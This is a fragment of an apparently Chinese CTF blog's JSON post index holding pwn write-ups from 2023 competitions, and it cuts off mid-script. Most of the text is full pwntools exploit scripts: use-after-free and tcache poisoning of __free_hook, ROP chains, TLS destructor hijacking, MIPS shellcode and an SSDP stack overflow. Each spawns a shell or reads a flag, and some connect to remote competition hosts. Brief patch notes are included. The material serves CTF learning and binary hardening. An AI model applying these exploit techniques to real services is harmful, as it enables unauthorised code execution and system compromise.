sl(nl[4]+e)login('my_name\\x00')ru('@Note $ ')sl(nl[0])ru('Size: ')#gdb.attach(io)s('A'*0x19)  进入 __stack_chk_fail​ 就会调用 abort(3)​​​​​‍继续执行的话，直接就可以触发 dbg 模式​​​​  进入dbg 模式了​‍  虽然进入dbg 模式了，但是 由于程序有 PIE ，想利用任意读任意写功能都是梦，  所以该这么泄露地址呢？这就需要利用 环境变量了，下图里的envp 指针是可以通过buf 溢出修改的​​‍  测试代码login('my_name\\x00')ru('@Note $ ')sl('A' * 0x32)ru('@Note $ ')sl(nl[0])ru('Size: ')gdb.attach(io)s('A'*0x19)​​  也就是说可以控制 envp 的指针，具体指向哪呢，怎么利用呢？继续看​‍  有个东西叫 LD_DEBUG​ ,  只要环境变量里有 LD_DEBUG=files​ 就可以在执行程序的时候 输出下面的那一坨东西 debug信息​​  ​LD_DEBUG​ help​​‍‍  利用 gift 泄露 stack 低16 位 ，泄露的地址 + 0x1c​ 也就是 我们 name 的低 16 位，可以把 envp 的低 16 位改成 name 的地址，这样我们的 envp 的内容就可以通过 name 来控制​​  然后继续运行就会 有这一坨调试数据  接受 libc_baselogin('LD_DEBUG=all\\x00')add(0x50,'tttttt\\n')#login('run\\x00')gift()ru('Super note: ')x =  int(ru('\\n'))name = x + 0x1cls(hex(x))lss('name')pay = 6 * p64(0) + p16(name)ru('Note $ ')sl(pay)#gdb.attach(io,'brva 0x000017E4')ru('@Note $ ')sl(nl[0])ru('Size: ')#gdb.attach(io)s('A'*0x19)ru('base: ')libc_base = int(r(18),16)ru('[Addr] ')libc = elf.libc# _GLOBAL_OFFSET_TABLE_gdb.attach(io)lss('libc_base')‍  最后是 exit(0) 退出，打 IO 的话 0x90 应该不够用. pass  由于是高版本。传统的 exit_hook 打 _rtld_global​ 不可用. pass  高版本下可以利用 劫持 tls 段内容 来控制 __call_tls_dtors​ ，​exit​ -&gt; __run_exit_handlers​ -&gt; __call_tls_dtors​‍​​‍  通过这个地址 泄露 ld 上的地址​​​​‍泄露 ld 地址 计算 tlslogin('LD_DEBUG=all\\x00')add(0x50,'tttttt\\n')#login('run\\x00')gift()ru('Super note: ')x =  int(ru('\\n'))name = x + 0x1cls(hex(x))lss('name')pay = 6 * p64(0) + p16(name)ru('Note $ ')sl(pay)#gdb.attach(io,'brva 0x000017E4')ru('@Note $ ')sl(nl[0])ru('Size: ')#gdb.attach(io)s('A'*0x19)ru('base: ')libc_base = int(r(18),16)libc = elf.libcld_addr = libc_base + 2203664lss('libc_base')lss('ld_addr')ru('[Addr] ')s(p64(ld_addr))ru('[Read] ')ld = uu64(r(6))ld_base = ld - 89392tls_base = ld_base - 100544gdb.attach(io)lss('libc_base')lss('ld_addr')lss('ld_base')lss('tls_base')​​‍  差不多了，然后 执行到 __call_tls_dtors​ 根据 情况取调试 就可以了‍​​// glibc 2.35__call_tls_dtors (void){  while (tls_dtor_list)    {      struct dtor_list *cur = tls_dtor_list;      dtor_func func = cur-&gt;func;#ifdef PTR_DEMANGLE      PTR_DEMANGLE (func);#endif      tls_dtor_list = tls_dtor_list-&gt;next;      func (cur-&gt;obj); // call rax      /* Ensure that the MAP dereference happens before\t l_tls_dtor_count decrement.  That way, we protect this access from a\t potential DSO unload in _dl_close_worker, which happens when\t l_tls_dtor_count is 0.  See CONCURRENCY NOTES for more detail.  */      atomic_fetch_add_release (&amp;cur-&gt;map-&gt;l_tls_dtor_count, -1);      free (cur);    }}libc_hidden_def (__call_tls_dtors)​​  exploit‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)gdbscript = '''brva 0x01500'''.format(**locals())binary = './dbgnote'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)io = start(binary,['run'])#io = remote()nl = ['Note_Add','Note_Delete','Note_Write','Note_Read',b'++--++--']def login(name):    ru('UserName: ')    sl(name)def add(size,text):    ru('@Note $ ')    sl(nl[0])    ru('Size: ')    sl(str(size))    ru(\"Note: \")    s(text)def rm(idx):    ru('@Note $ ')    sl(nl[1])    ru(\"Index: \")    sl(str(idx))def edit(idx,text):    ru('@Note $ ')    sl(nl[2])    ru(\"Index: \")    sl(str(idx))    ru(\"Note: \")    sl(text)def show(idx):    ru('@Note $ ')    sl(nl[3])    ru(\"Index: \")    sl(str(idx))def gift(e=b'\\x00'):    ru('@Note $ ')    sl(nl[4]+e)login('LD_DEBUG=all\\x00')add(0x50,'tttttt\\n')#login('run\\x00')gift()ru('Super note: ')x =  int(ru('\\n'))name = x + 0x1cls(hex(x))lss('name')pay = 6 * p64(0) + p16(name)ru('Note $ ')sl(pay)#gdb.attach(io,'brva 0x000017E4')ru('@Note $ ')sl(nl[0])ru('Size: ')#gdb.attach(io)s('A'*0x19)ru('base: ')libc_base = int(r(18),16)libc = elf.libcld_addr = libc_base + 2203664lss('libc_base')lss('ld_addr')ru('[Addr] ')s(p64(ld_addr))ru('[Read] ')ld = uu64(r(6))ld_base = ld - 89392tls_base = ld_base - 100544#gdb.attach(io)lss('libc_base')lss('ld_addr')lss('ld_base')lss('tls_base')def ror(num,i):    part1 = num &gt;&gt; i    part2 = num &lt;&lt; (64 - i)    part2 &amp;= (1 &lt;&lt; 64) -1    return part1 + part2ru('[Addr] ')target = tls_base - 88#mov    rbp, qword ptr fs:[rbx]#RBX  0xffffffffffffffa8 = - 88s(p64(target))libc = elf.libcsystem = libc_base + libc.sym['system']bin_sh = libc_base + next(libc.search(b'/bin/sh'))t1 = ror(target,0x11)t2 = t1 ^ systemru('[Write] ')pay = p64(target) + p64(bin_sh) + p64(target)pay = pay.ljust(88,b'A')pay = pay + 0x10 * b'\\x00'pay = pay + p64(tls_base) + p64(0) #  需要一个地址pay = pay + 0x10 * b'\\x00'pay += p64(t2) # 0x90s(pay)io.interactive()​​‍Fix  把几处溢出的地方修复应该就没问题了‍‍​​‍​​‍‍cgi‍程序分析‍      模拟 cgi , libc 2.31 的堆题，分析菜单要我的命啊        UAF 漏洞, 利用就比较简单了  ‍break​​from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)binary = './cgi'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary);libc = elf.libcif (libelf!=''): libc = ELF(libelf)gdbscript = '''brva 0x0000001C8Dcontinue'''.format(**locals())io = start(binary)rn = b'\\r\\n'def add(idx,name,pwd,size):    data  = b'PUT /profile?' + (b'id=%d' % idx) + rn    data += b' ' + rn    data += b'Content-Type: application/x-www-form-urlencoded' + rn * 2    data += (b'name=%s' % name) + (b'&amp;password=%s' % pwd) + (b'&amp;password_length=%d' % size) + rn    s(data)def edit(idx,name,pwd):    data  = b'POST /profile?' + (b'id=%d' % idx) + rn    data += b' ' + rn    data += b'Content-Type: application/x-www-form-urlencoded' + rn * 2    data += (b'name=%s' % name) + (b'&amp;password=%s' % pwd) + rn    s(data)def show(idx):    data  = b'GET /profile?' + (b'id=%d' % idx) + rn    data += b' ' + rn    data += b'Content-Type: application/x-www-form-urlencoded' + rn * 2    s(data)def rm(idx):    data  = b'DELETE /profile?' + (b'id=%d' % idx) + rn    data += b' ' + rn    data += b'Content-Type: application/x-www-form-urlencoded' + rn * 2    s(data)add(0,b'name1',b'mepwd1',0x440)add(1,b'name2',b'mepwd2',0x440)ru('HTTP')rm(0)ru('HTTP')show(0)ru('ord=')x = uu64(r(6))libc_base = x - 2018272libc = elf.libc__free_hook = libc_base + libc.sym['__free_hook']system =    libc_base + libc.sym['system']lss('x')lss('libc_base')rm(1)edit(1,p64(__free_hook)[:-2],b'456')add(2,b'/bin/sh',b'/bin/sh',0x440)add(3,p64(system)[:-2],b'mepwd2',0x440)rm(2)io.interactive()‍Fix  漏洞在 DELETE /profile​  free​ 后没有清除堆块指针，导致free 后的堆块 仍然可以被操作，      只需要free 后， 然后再把 bss 段上的指针清空即可    原始程序汇编​​​​‍  加固后​​​​‍lea r15, qword ptr[0x7060]mov r14, [rdx+r15]mov rdi,[r14+0x28]call _freemov rdi, [r15]call _freexor r14,14mov [r15],r14​​‍‍vuln  覆盖种子，栈溢出‍breakfrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)gdbscript = '''continue'''.format(**locals())binary = './vuln'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)io = start(binary)#io = remote()from ctypes import *import timedll = CDLL('/usr/lib/x86_64-linux-gnu/libc.so.6')ru('Please enter your name:\\n')#gdb.attach(io)s(18*'A')dll.srand(0x41414141)for i in range(100):    x = dll.rand() % 100 + 1    ru('Guess the random number:\\n')    sl(p32(x))ru(\"You are talented, here's your gift!\\n\")pay = 0x38 * b'A' + p64(rop.find_gadget(['pop rdi','ret'])[0]) + p64(elf.got['puts']) + p64(elf.sym['puts']) + p64(0x0401261)sl(pay)x = uu64(r(6))libc = elf.libclibc_base = x - libc.sym['puts']system = libc_base + libc.sym['system']bin_sh = libc_base + next(libc.search(b'/bin/sh'))ls(hex(libc_base))pay = 0x38 * b'A' + p64(rop.find_gadget(['ret'])[0])*1 + p64(rop.find_gadget(['pop rdi','ret'])[0]) + p64(bin_sh) + p64(system) + p64(elf.sym['main'])sl(pay)io.interactive()‍Fix‍  控制 read 的大小即可"
  },
  
  {
    "title": "第六届全国网络安全挑战赛青少年专项赛-实践赛-AWDP-Pwn-WriteUps_by_AhiSec",
    "url": "/posts/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B%E9%9D%92%E5%B0%91%E5%B9%B4%E4%B8%93%E9%A1%B9%E8%B5%9B-%E5%AE%9E%E8%B7%B5%E8%B5%9B-AWDP-Pwn-WriteUps_by_AhiSec/",
    "categories": "CTF",
    "tags": "CTF",
    "date": "2023-12-17 20:00:00 +0800",
    





    
    "snippet": "‍‍2023-12-17-第六届全国网络安全挑战赛青少年专项赛-实践赛-AWDP-Pwn-WriteUps_by_AhiSec‍‍pwn-easygo‍程序分析‍      存在一个后门        输入溢出覆盖栈上数据        没什么好玩的  ‍Break‍  溢出直接覆盖就行了，‍from pwn import *s       = lambda data            ...",
    "content": "‍‍2023-12-17-第六届全国网络安全挑战赛青少年专项赛-实践赛-AWDP-Pwn-WriteUps_by_AhiSec‍‍pwn-easygo‍程序分析‍      存在一个后门        输入溢出覆盖栈上数据        没什么好玩的  ‍Break‍  溢出直接覆盖就行了，‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)gdbscript = '''b *0x049B4C4b *0x049B5D6continue'''.format(**locals())binary = './eazygo'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)io = start(binary)io = remote('8.147.135.51',23882)ru(':')sl(p64(0xFFFFFFFFFFFFFFF6)*2)ru(':')#sl(b'A'*(14*8)+p64(0)+p64(0x049B5E0)*15)sl(p64(0xFFFFFFFFFFFFFFF6)*14+p64(0)+p64(0x049B5E0)*15) # 实际没这么复杂# 为什么加 p64(0) 调试你就知道了io.interactive()‍Fixpatch 后门函数‍​​‍​​‍‍phone_book‍程序分析‍      比赛时没有 Break ，赛后看看        漏洞点比较刁钻，赛后看了一天才找到漏洞，我是fw  ‍​​‍‍  这么讲吧  size  = 输入的总长度 0x40 #可修改size  strdup(strlen(input_str)) # 如果 我们输入的 都是 NUll 字节strlen得到的是 0 , strdup 只会 申请 到 0x21 的chunk  但是add 后面提供了 改 ， 大概这个范围 input_str[size] size 是 0x40 但是 申请到的堆块只有 0x21 所以我们可以 修改 这个堆块下的数据，如 size fd bk ，但是只能改成 “0123456789” 这些  ‍​​‍​​‍​​‍  修改 tcachebins 链表‍​​‍​​Break‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)gdbscript = '''brva 0x0001606brva 0x000142Bcontinue'''.format(**locals())binary = './pwn.bak'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)io = start(binary)#io = remote()def add(idx,num,name,y='n',i='0',c='2'):    ru('&gt;&gt;')    sl('1')    ru(\"idx:\")    sl(str(idx))    ru('Please Input Phone Number: ')    sl(num)    ru('Do you need to change phone Number? (y/n): ')    if(y=='y'):        sl('y')        ru('which number is wrong?')        sl(i)        ru('please input right char:')        sl(c)    else:        sl('n')    ru('please input name: ')    sl(name)def show(idx):    ru('&gt;&gt;')    sl('2')    ru('card idx:')    sl(str(idx))    ru('phone: ')def rm(idx):    ru('&gt;&gt;')    sl('3')    sl(str(idx))add(0,'\\x00'*0x500,'A'*0x40)add(1,'\\x00' * 0x40,'N'*0x10,'y',f'{0}','1')show(1)x = uu64(r(6)) &gt;&gt; 8 &lt;&lt; 8libc_base = x - 2018048lss('libc_base')libc = elf.libc__free_hook = libc_base + libc.sym['__free_hook']system = libc_base + libc.sym['system']add(2,'\\x00',p64(__free_hook))add(3,'\\x00','name2')add(4,'\\x00','name3')rm(4)rm(3)## fsadd(5,'\\x00' * 0x40,'/bin/sh;','y',f'{0x20}','0')add(0,'\\x00',p64(system))gdb.attach(io,'brva 0x01813')rm(5)io.interactive()‍​​‍‍Fix‍比赛是 这样fix 的 改指针，呵呵呵，防御成功,学长教的‍​​‍‍​​‍‍  找到漏洞位置后，用新方法加固漏洞点‍​​‍​​‍先 nop 掉‍​​‍‍  然后加代码‍mov rcx, [rbp - 0x190]    ; 存储size 的指针 mov [rcx], rdx            ;strdup() 返回的 sizemov rcx, [rbp - 0x188]     ; 存储heap_ptr 的指针 mov [rcx], rax             ;strdup() 返回的 堆块指针‍​​‍  测试 没问题，bss 指针也没问题‍END‍‍  创新赛 8‍​​‍  实践赛  2‍​​‍‍‍​​‍‍‍‍​​"
  },
  
  {
    "title": "2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups",
    "url": "/posts/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-%E8%B6%8A%E8%89%B0%E5%B7%A8-%E8%B6%8A%E7%8B%82%E7%83%AD-pwn-Writeups/",
    "categories": "CTF",
    "tags": "CTF",
    "date": "2023-11-25 20:00:00 +0800",
    





    
    "snippet": "‍‍DASCTF X CBCTF 2023｜无畏者先行‍‍Pwn-ASadStory‍  保护​​  沙箱​​‍  exploitfrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), dat...",
    "content": "‍‍DASCTF X CBCTF 2023｜无畏者先行‍‍Pwn-ASadStory‍  保护​​  沙箱​​‍  exploitfrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)gdbscript = '''continue'''.format(**locals())binary = '../challenge'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)io = start(binary)io = remote('node4.buuoj.cn',27797)ru('1.yes / 2.no\\n')ru(': ')sl('1')ru('your choice: ')sl('1')ru('initial函数的地址:')x = int(r(14),16)elf_base = x - 4681elf.address = elf_base#bss = elf.bss()bss = elf_base + 0x4000lss('x')lss('elf_base')lss('bss')magic = elf_base + 0x0000000000001232 # add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax] ; retrdi   = elf_base + 0x0000000000001643 # pop rdi ; retrsi   = elf_base + 0x0000000000001641 # pop rsi ; pop r15 ; retread_plt = elf.plt['read']read_got = elf.got['read']csu1 = elf_base + 0x0163Acsu2 = elf_base + 0x01620lret = elf_base + 0x015CF#gdb.attach(io,'brva 0x000147B')# 00147B#gdb.attach(io,'brva 0x001632')sl('2')pause()pay  = b'A' * 0x38pay += p64(csu1)pay += p64(0) # rbxpay += p64(1) # rbppay += p64(0) # r12 rdipay += p64(bss+0x200) # r13 rsipay += p64(0x200) # r14 rdxpay += p64(elf.got['read']) # r15 call_addrpay += p64(csu2)pay += p64(0x41)pay += p64(bss+0x200-8) * 6pay += p64(lret) # leave retsl(pay)pause()#libc = elf.libclibc = ELF('./libc-2.31.so')mprotect    = libc.sym['mprotect']read_offset = libc.sym['read']offset = (mprotect - read_offset)target = elf.got['read']pay  = p64(csu1)pay += p64(offset) # rbxpay += p64(target+0x3d) # rbppay += p64(0) * 4pay += p64(magic)pay += p64(csu1)pay += p64(0) # rbxpay += p64(1) # rbppay += p64(bss) # r12 # rdipay += p64(0x1000) # rsipay += p64(0x7) # rdxpay += p64(bss+0x200+0x80) # retpay += p64(csu2)pay += p64(lret+1) * 7pay += p64(rdi)pay += p64(bss)pay += p64(elf.plt['read'])pay += p64(bss+0x200+len(pay)+0x8)pay += b'\\x90' * 0x10#pay += asm(shellcraft.open('flag'))#pay += asm(shellcraft.sendfile(1,'rax',0,0x50))#pay += asm(shellcraft.sh())pay += asm(shellcraft.openat(-1, '/flag'))pay += asm(shellcraft.sendfile(2,'rax',0,0x50))sl(pay)io.interactive()‍‍Pwn-garbage‍​​‍‍  off by null‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)gdbscript = '''continue'''.format(**locals())binary = './challenge'if (binary!=''): elf  = ELF(binary)libc = elf.libcio = start(binary)#io = remote('node4.buuoj.cn',25983)def add(idx,size=0x4f8,text='A'):    ru('your choice: ')    sl('1')    ru('pls input the idx of garbage: ')    sl(str(idx))    ru('pls input the size of garbage: ')    sl(str(size))    ru('pls input the content of garbage: ')    s(text)def rm(idx):    ru('your choice: ')    sl('2')    ru('pls input the idx of garbage: ')    sl(str(idx))def show(idx):    ru('your choice: ')    sl('3')    ru('pls input the idx of garbage: ')    sl(str(idx))    ru('Content: ')def edit(idx,text):    ru('your choice: ')    sl('4')    ru('pls input the idx of garbage: ')    sl(str(idx))    ru('pls input the new content of garbage:')    s(text)add(0)add(1)add(2)add(3)add(4)note = 0x0404060fd = note - 0x18bk = note - 0x10pay = p64(0) + p64(0x4f1)pay += p64(fd) + p64(bk)pay = pay.ljust(0x4f0,b'\\x00')pay += p64(0x4f0)edit(0,pay)rm(1)pay = p64(0) * 3pay += p64(fd)pay += p64(0)pay += p64(0x403FB8)pay += b'\\n'edit(0,pay)show(2)libc_base = uu64(r(6)) - libc.sym['puts']lss('libc_base')libc = elf.libclibc.address = libc_baseenv =  libc.sym['environ']system = libc.sym['system']libc_rop = ROP(libc)rdi = libc_rop.find_gadget(['pop rdi','ret'])[0]bin_sh = next(libc.search(b'/bin/sh'))pay  = p64(0) * 3pay += p64(fd)pay += p64(0)pay += p64(env)#pay += p64(fio+)pay += b'\\n'edit(0,pay)show(2)stack = uu64(r(6))lss('stack')ret= stack - 352#gdb.attach(io,'b *0x004017E5')pay  = p64(0) * 3pay += p64(ret) + b'\\n'edit(0,pay)#fake_IO = 0x404100pay = p64(rdi+1) + p64(rdi) + p64(bin_sh) + p64(system) + b'\\n'edit(0,pay)## house of apple2  直接 puts 刷新IO 可以控制 栈有问题## puts IO #fake_IO_FILE += p64(libc_base + ogg[3])#fake_IO_FILE  = p64(0) * 2#fake_IO_FILE += p64(setcontext + 61)#fake_IO_FILE += p64(0) * 14#fake_IO_FILE += p64(fake_IO_addr+0x100)#fake_IO_FILE += p64(0) * 2#fake_IO_FILE += p64(fake_IO_addr)#fake_IO_FILE += p64(0) * 6#fake_IO_FILE += p64(_IO_wfile_jumps + 0x20-0x40)#fake_IO_FILE += p64(fake_IO_addr-0x68+0x10)#edit(2,fake_IO_FILE+b'\\n')#print(_IO_wfile_jumps)#edit(0,p64(fio)+b'\\n')#edit(2,fake_IO_FILE)#add(0x400,fake_IO_FILE)io.interactive()‍Pwn-shaopi‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'mips'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)gdbscript = '''continue'''.format(**locals())#io = process(['qemu-mipsel', '-g', '1000', '-L', '.' ,'./challenge'])#io = process(['qemu-mipsel', '-g', '1234', '-L', '.' ,'./pwn'])#io = process(['qemu-mipsel-static','./challenge'])#io = process(['qemu-mipsel','./challenge'])io = remote('node4.buuoj.cn',26794)ru('your passphrase: ')sl(bytes.fromhex('e4b889e58583e4b880e4b8b2e58d81e58583e4b889e4b8b2'))ru('Congratulation!\\n')pause()#pay = 0x44 * b'A' +p32(0x0043965C) + shellcode# 0x439670    lw     $a0, 0x3c($sp)# 0x439674    sw     $v0, 0x1c($sp)# 0x439678    sw     $zero, 0x18($sp)# 0x43967c    sw     $zero, 0x10($sp)# 0x439680    lw     $v0, 0x34($sp)# ► 0x439684    jalr   $t9                           &lt;0x41414141&gt;pay = cyclic(0x40) + p32(0x00431084) +p32(0x0043965C) + 88*b'\\x00' + asm(shellcraft.read(0,'$a2',0x200))sl(pay)pause()# 溢出数据有限 所以选择 二次 read shellcodepay = asm(shellcraft.sh())sl(b'\\x00'*0x20 + pay)io.interactive()‍0x0043965C 用来调整寄存器数据Contorl Jump 是 执行完gadget 后的跳转， 我选择的gatget   最后的 是 jalr $fp​ ，$fp​ 有就是栈 是我们可控的‍​​‍0x00431084 $fp 返回地址‍调整后 $a2​ 指向的地址也就是 shellcode in stack 的 addr 直接跳过去‍​​‍​‍‍‍Pwn-fakeSSDP‍我是菜鸡，跟着wp做的‍‍⁣﻿⁢﻿⁣⁤‬⁡‍‬⁢⁣⁤‌⁡⁢⁤‌⁡⁡﻿‍⁣⁣‬‬‌﻿⁣﻿‬‬⁢⁡‌‌‌‍DAS X 0psu3 - 飞书云文档 (feishu.cn)‍‍还不知道 SSDP 是啥，我就抓个包看看‍​​‍‍‍‍pay  = b'M-SEARCH * HTTP/1.1\\r\\n'pay += b'HOST: 239.255.255.250:1900\\r\\n'pay += b'MAN: \"ssdp:discover\"\\r\\n'pay += b'MX: 1\\r\\n'pay += b'ST: urn:dial-multiscreen-org:service:dial:1\\r\\n'pay += b'USER-AGENT: Microsoft Edge/119.0.2151.93 Windows\\r\\n'‍‍​​‍‍  目测 system函数‍​​​​‍有 sandbox函数，导致貌似不能利用命令拼接‍‍​​‍​​​​​​‍gdb.attach(io,'b *0x0403591')ru('Waiting for SSDP request')from base64 import b64encodep = 300 * b'B'pay  = b'M-SEARCH * HTTP/1.1\\r\\n'pay += b'HOST: 239.255.255.250:1900\\r\\n'pay += b'MAN: \"ssdp:discover\"\\r\\n'pay += b'MX: 3\\r\\n'pay += b'ST: ssdp:all '+p+b'\\r\\n' // 主要处理点pay += b'USER-AGENT: Microsoft Edge/119.0.2151.93 Windows\\r\\n'sl(b64encode(pay))io.interactive()‍There is a stack overflow vulnerability​​‍rsi in the value in our ST, overwrite return address as “call rsi”‍​​‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the 